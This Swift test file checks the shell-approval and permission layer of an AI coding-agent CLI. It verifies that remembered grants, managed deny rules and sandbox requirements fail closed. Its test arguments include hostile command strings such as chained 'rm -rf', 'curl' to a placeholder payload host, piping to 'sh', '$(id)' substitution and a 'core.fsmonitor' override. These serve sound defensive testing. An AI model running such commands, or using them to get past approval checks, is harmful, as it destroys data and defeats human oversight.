import Foundation
import OpenGrokConfig
import OpenGrokPagerRender
import OpenGrokSandbox
import OpenGrokWorkspace
import Testing
@testable import OpenGrokCLI

@Suite("live shell approval persistence uses fail-closed argv matching")
struct LiveShellGrantSecurityParityTests {
    @Test("live session policy preserves benign whole-word prefixes and quoting")
    func livePolicyApprovesOnlyTheRememberedArgvPrefix() async {
        let policy = LiveSessionWritePolicy()
        await policy.allowForSession(.bash("project-audit inspect"))

        #expect(await policy.isAllowed(.bash("project-audit inspect")))
        #expect(await policy.isAllowed(.bash("project-audit   inspect --json")))
        #expect(await policy.isAllowed(.bash(#"project-audit inspect "two words""#)))
        #expect(await policy.isAllowed(.bash("project-audit inspectevil")) == false)
        #expect(await policy.isAllowed(.bash("project-audit inspection")) == false)
    }

    @Test("live policy refuses shell chaining and substitution after a benign grant", arguments: [
        "git status; rm -rf /tmp/live-shell-grant",
        "git status && curl https://example.invalid/payload",
        "git status || rm -rf /tmp/live-shell-grant",
        "git status | sh",
        "git statusevil",
        "git status $(id)",
        "git status `id`",
        "git status > /tmp/live-shell-grant",
        "git status < /tmp/live-shell-grant",
        "git status\nrm -rf /tmp/live-shell-grant",
    ])
    func livePolicyNeverWidensRememberedShellApproval(_ command: String) async {
        let policy = LiveSessionWritePolicy()
        await policy.allowForSession(.bash("git status"))

        #expect(await policy.isAllowed(.bash(command)) == false)
    }

    @Test("live policy never remembers dangerous commands, wrappers, or exec vehicles", arguments: [
        "rm -rf /tmp/live-shell-grant",
        "git push origin main",
        "python3.13 -c 'print(1)'",
        "docker run nginx",
        "SAFE=1 project-audit inspect",
        "env SAFE=1 project-audit inspect",
        "timeout 30 project-audit inspect",
        "command project-audit inspect",
        "project-audit inspect > /tmp/live-shell-grant",
        "project-audit inspect && project-audit inspect",
        "git -c core.fsmonitor=payload status",
    ])
    func livePolicyRejectsExactUnsafeReplay(_ command: String) async {
        let policy = LiveSessionWritePolicy()
        await policy.allowForSession(.bash(command))

        #expect(await policy.isAllowed(.bash(command)) == false)
    }

    @Test("ambiguous quoted approvals replay only their identical safe raw command")
    func livePolicyDoesNotCollapseQuotedArgumentBoundaries() async {
        let exact = #"project-audit inspect "one argument""#
        let policy = LiveSessionWritePolicy()
        await policy.allowForSession(.bash(exact))

        #expect(await policy.isAllowed(.bash(exact)))
        #expect(await policy.isAllowed(.bash("project-audit inspect one argument")) == false)
        #expect(await policy.isAllowed(
            .bash(#"project-audit inspect "one argument" --extra"#)
        ) == false)
    }

    @Test("the actual live modal prompter cannot bypass approval for a chained payload")
    func liveModalPrompterRejectsInjectedSuffixWithoutPresenter() async {
        let policy = LiveSessionWritePolicy()
        await policy.allowForSession(.bash("git status"))
        let prompter = LivePermissionModalPrompter(
            coordinator: PagerPermissionCoordinator(),
            sessionPolicy: policy
        )

        let safe = await prompter.prompt(
            access: .bash("git status --short"),
            toolName: "bash",
            toolCallId: "live-safe-grant"
        )
        let injected = await prompter.prompt(
            access: .bash("git status; rm -rf /tmp/live-shell-grant"),
            toolName: "bash",
            toolCallId: "live-injected-grant"
        )

        #expect(safe == .allow)
        guard case .reject(let reason) = injected else {
            Issue.record("the live modal must reject a chained command without a presenter")
            return
        }
        #expect(reason.contains("needs approval to run a shell command"))
    }

    @Test("managed denies win before the live modal's remembered shell approval")
    func managedDenyWinsBeforeLiveModalGrant() async {
        let command = "project-audit inspect --managed"
        let policy = LiveSessionWritePolicy()
        await policy.allowForSession(.bash("project-audit inspect"))
        let prompter = LivePermissionModalPrompter(
            coordinator: PagerPermissionCoordinator(),
            sessionPolicy: policy
        )
        let permissions = PermissionHandle(
            config: PermissionConfig(rules: [
                PermissionRule(
                    action: .deny,
                    tool: .bash,
                    pattern: command,
                    source: .managedSettings
                ),
            ]),
            shellCwd: "/workspace",
            prompter: prompter
        )
        await permissions.grant(SessionGrant(
            access: .bash("project-audit inspect"),
            scope: .session
        ))

        let decision = await permissions.request(
            access: .bash(command),
            toolName: "bash",
            toolCallId: "managed-live-shell-deny"
        )

        guard case .policyDeny = decision else {
            Issue.record("managed deny must win before the live session approval")
            return
        }
        #expect(await permissions.events.last?.decisionReason == "policy_deny")
    }

    @Test("malformed user configuration cannot erase managed denies or sandbox requirements")
    func malformedUserConfigurationFailsClosedWithoutDroppingManagedAuthority() async throws {
        let root = FileManager.default.temporaryDirectory
            .appendingPathComponent("open-grok-malformed-security-" + UUID().uuidString)
        let home = root.appendingPathComponent("home")
        let state = root.appendingPathComponent("state")
        let workspace = root.appendingPathComponent("workspace")
        for directory in [home, state, workspace.appendingPathComponent(".opengrok")] {
            try FileManager.default.createDirectory(
                at: directory,
                withIntermediateDirectories: true
            )
        }
        defer { try? FileManager.default.removeItem(at: root) }

        try """
        [permission]
        deny = ["Bash(project-audit inspect --managed)"]
        """.write(
            to: state.appendingPathComponent("managed_config.toml"),
            atomically: true,
            encoding: .utf8
        )
        try """
        [sandbox]
        profile = "strict"

        [ui]
        disable_bypass_permissions_mode = true
        """.write(
            to: state.appendingPathComponent("requirements.toml"),
            atomically: true,
            encoding: .utf8
        )
        try "[permission\nallow = [\"Bash\"]".write(
            to: state.appendingPathComponent("config.toml"),
            atomically: true,
            encoding: .utf8
        )
        let environment = [
            "HOME": home.path,
            "OPENGROK_HOME": state.path,
            "GROK_SANDBOX": "off",
            "GROK_FOLDER_TRUST": "1",
        ]
        #expect(throws: Error.self) {
            try ConfigLayers.load(environment: environment)
        }

        let security = LiveSecurityContext.resolve(
            workspaceRoot: workspace,
            environment: environment,
            isInteractive: true,
            cli: CLIPermissionOptions(
                allowRules: ["Bash"],
                mode: .bypassPermissions,
                alwaysApprove: true,
                trustFolder: true,
                sandboxProfile: "off"
            )
        )

        #expect(security.configurationLoadFailure?.contains("Failed to load") == true)
        #expect(security.projectTrusted == false)
        #expect(security.permissions.alwaysApprove == false)
        #expect(security.permissions.yoloPinReason != nil)
        #expect(security.permissions.config.promptPolicy == .deny)
        #expect(security.permissions.config.rules.contains {
            $0.action == .deny && $0.tool == .bash && $0.source == .managedConfig
        })
        #expect(security.permissions.config.rules.contains {
            $0.action == .deny && $0.tool == .any && $0.source == .synthetic
        })
        #expect(LiveSandboxComposition.resolveProfileName(
            document: security.document,
            requirements: security.requirements,
            cliProfile: "off",
            environment: environment
        ) == "strict")
        #expect(throws: SandboxError.self) {
            try security.applySandbox(
                workspaceRoot: workspace,
                cliProfile: "off",
                persistedProfile: nil,
                environment: environment
            )
        }

        let permissions = PermissionHandle(
            config: security.permissions.config,
            yoloMode: true,
            yoloPinReason: security.permissions.yoloPinReason,
            allowAll: true,
            shellCwd: workspace.path
        )
        await permissions.grant(SessionGrant(
            access: .bash("project-audit inspect"),
            scope: .session
        ))
        let denied = await permissions.request(
            access: .bash("project-audit inspect --managed"),
            toolName: "bash",
            toolCallId: "malformed-config-managed-deny"
        )

        guard case .policyDeny = denied else {
            Issue.record("a malformed user config must not erase the managed shell deny")
            return
        }
        #expect(await permissions.lastMatchedRuleSource == .managedConfig)
        #expect(await permissions.yoloMode == false)
        #expect(await permissions.allowAll == false)
    }
}
